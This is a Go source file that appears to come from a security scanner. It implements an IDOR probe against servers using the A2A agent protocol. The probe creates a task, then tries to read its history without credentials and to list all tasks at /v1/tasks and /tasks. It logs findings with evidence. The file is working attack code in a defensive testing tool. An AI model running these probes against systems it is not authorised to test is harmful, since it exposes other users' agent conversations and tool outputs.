package a2a

import (
	"context"
	"fmt"

	"github.com/calbebop/batesian/internal/attack"
)

// TaskIDORExecutor tests whether A2A task history is accessible by unauthenticated
// callers who know a task UUID (rule a2a-task-idor-001).
//
// Attack sequence:
//  1. Submit a task via message/send to obtain a taskId
//  2. Call tasks/get with that taskId from a new unauthenticated HTTP connection
//  3. If history returns: IDOR confirmed — task ownership is not enforced
//  4. Also probe tasks/list (some bindings expose GET /v1/tasks) for server-wide disclosure
type TaskIDORExecutor struct {
	rule attack.RuleContext
}

// NewTaskIDORExecutor creates an executor for the a2a-task-idor attack type.
func NewTaskIDORExecutor(r attack.RuleContext) *TaskIDORExecutor {
	return &TaskIDORExecutor{rule: r}
}

func (e *TaskIDORExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	vars := attack.NewVars(target, opts.OOBListenerURL)
	client := attack.NewHTTPClient(opts, vars)

	endpoint := vars.BaseURL + "/"
	var findings []attack.Finding

	// A2A-sdk v1.0.x requires A2A-Version: 1.0 header and PascalCase method names.
	// Role is integer: 1=user, 2=agent. Parts use flat text field.
	a2aHeaders := map[string]string{"A2A-Version": "1.0"}

	// Step 1: Create a probe task and get its taskId (try v1.0 first, fall back to v0.3)
	sendResp, err := client.POST(ctx, endpoint, a2aHeaders, map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      "batesian-create-" + vars.RandID,
		"method":  "SendMessage",
		"params": map[string]interface{}{
			"message": map[string]interface{}{
				"role":      1, // USER
				"parts":     []interface{}{map[string]string{"text": "batesian idor probe " + vars.RandID}},
				"messageId": "batesian-" + vars.RandID,
			},
		},
	})
	// Fallback to v0.3 slash-method for older deployments
	if err != nil || (!sendResp.IsSuccess() && isJSONRPCError(sendResp.Body)) {
		sendResp, err = client.POST(ctx, endpoint, nil, map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      "batesian-create-" + vars.RandID,
			"method":  "message/send",
			"params": map[string]interface{}{
				"message": map[string]interface{}{
					"role":      "user",
					"parts":     []interface{}{map[string]string{"kind": "text", "text": "batesian idor probe " + vars.RandID}},
					"messageId": "batesian-" + vars.RandID,
				},
			},
		})
	}
	if err != nil || !sendResp.IsSuccess() || isJSONRPCError(sendResp.Body) {
		return nil, nil // target is not a responsive A2A server
	}

	taskID, contextID := extractTaskContext(sendResp.Body)
	if taskID == "" {
		return nil, nil // could not extract taskId; skip
	}

	// Step 2: Retrieve the task via tasks/get — simulate a different caller with
	// no credentials. Deliberately use NewUnauthHTTPClient so opts.Token is not
	// injected; the whole point is to confirm IDOR from an unauthenticated caller.
	freshVars := attack.NewVars(target, opts.OOBListenerURL)
	freshClient := attack.NewUnauthHTTPClient(opts, freshVars)

	getResp, err := freshClient.POST(ctx, endpoint, a2aHeaders, map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      "batesian-get-" + vars.RandID,
		"method":  "GetTask",
		"params": map[string]interface{}{
			"id":            taskID,
			"historyLength": 10,
		},
	})
	if err == nil && getResp.IsSuccess() && !isJSONRPCError(getResp.Body) &&
		getResp.ContainsAny(`"history"`, `"contextId"`, taskID, contextID) {
		findings = append(findings, attack.Finding{
			RuleID:     e.rule.ID,
			RuleName:   e.rule.Name,
			Severity:   "high",
			Confidence: attack.ConfirmedExploit,
			Title:      "A2A task history accessible without authenticating as task owner (IDOR)",
			Description: fmt.Sprintf(
				"tasks/get for task %s (contextId %s) returned full task history in a "+
					"connection that did not present the original session credentials. Any caller "+
					"who obtains a task UUID can read the full conversation history, including "+
					"LLM responses, tool outputs, and embedded system context.", taskID, contextID),
			Evidence:    fmt.Sprintf("taskId: %s\ncontextId: %s\nHTTP %d\n%s", taskID, contextID, getResp.StatusCode, snippet(getResp.Body, 500)),
			Remediation: e.rule.Remediation,
			TargetURL:   endpoint,
		})
	}

	// Step 3: Probe tasks/list — some implementations expose this as GET /v1/tasks
	// or as a JSON-RPC method tasks/list (not in current spec, but present in some SDK versions)
	listEndpoints := []string{
		vars.BaseURL + "/v1/tasks",
		vars.BaseURL + "/tasks",
	}
	// Step 3 uses freshClient (unauth) for the same reason as step 2.
	for _, le := range listEndpoints {
		listResp, err := freshClient.GET(ctx, le, nil)
		if err == nil && listResp.IsSuccess() && listResp.ContainsAny(`"tasks"`, `"contextId"`, `"history"`) {
			findings = append(findings, attack.Finding{
				RuleID:     e.rule.ID,
				RuleName:   e.rule.Name,
				Severity:   "critical",
				Confidence: attack.ConfirmedExploit,
				Title:      "A2A server exposes tasks/list without authentication — server-wide task disclosure",
				Description: fmt.Sprintf(
					"GET %s returned a list of tasks without authentication. This exposes all task "+
						"IDs, context IDs, and potentially conversation history for every session on "+
						"the server.", le),
				Evidence:    fmt.Sprintf("HTTP %d from %s\n%s", listResp.StatusCode, le, snippet(listResp.Body, 400)),
				Remediation: e.rule.Remediation,
				TargetURL:   le,
			})
			break
		}
	}

	return findings, nil
}
